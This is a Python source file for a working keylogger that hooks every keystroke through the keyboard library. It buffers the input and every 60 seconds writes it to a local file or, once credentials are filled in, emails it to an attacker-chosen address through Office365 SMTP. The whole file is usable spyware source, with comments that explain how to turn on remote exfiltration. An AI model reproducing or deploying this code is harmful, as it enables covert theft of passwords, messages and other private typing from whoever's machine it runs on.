'''
    Importing necessary modules for the project
'''
import keyboard

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from threading import Timer
from datetime import datetime

'''
    Configurations for keylogger
'''
SEND_REPORT_EVERY = 60 # in seconds
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""

class Keylogger:

    '''
        constructor of the class to initialize the variables
    '''
    # if you want to report key logs to local file, then set `report_method` = "file"
    # if you want to report key logs via email, then set `report_method` = "email" and set the email and password in the config section
    def __init__(self, interval, report_method = "file"):
        
        # SEND_REPORT_EVERY is passed to interval
        self.interval = interval

        self.report_method = report_method

        # string variable that logs all the keystrokes for set self.interval
        self.log = ""

        # log start & end time
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    '''
        `callback()` function is called whenever a key is released
    '''
    def callback(self, event):

        name = event.name

        # if key released is a special key (e.g. ctrl, alt, etc.)
        if len(name) > 1:

            # if key released is space
            if name == "space":
                # " " instead of "space"
                name = " "

            # if key released is enter    
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            
            # if key released is a decimal
            elif name == "decimal":
                name = "."
            
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        # adding the key name to `self.log` variable
        self.log += name
    
    '''
        `update_filename()`, `report_to_file()` to report our key logs to a local file
    '''
    def update_filename(self):
        # function to create a file named as "keylog-{start_time}_{end_time}.txt"
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # function to write the logs to the file created in `update_filename()`
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    '''
        `prepare_mail()`, `sendmail()` to report our key logs to initialized email address
    '''
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
    
    '''
        `report()` function to reset the `self.log` variable after every `self.interval`
    '''
    def report(self):
        # report if there is something in `self.log`
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

                # comment below line, if you don't want to print in the console.
                print(f"[{self.filename}] - {self.log}")

            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        
        # setting the thread as daemon (dies when main thread die)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")

        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()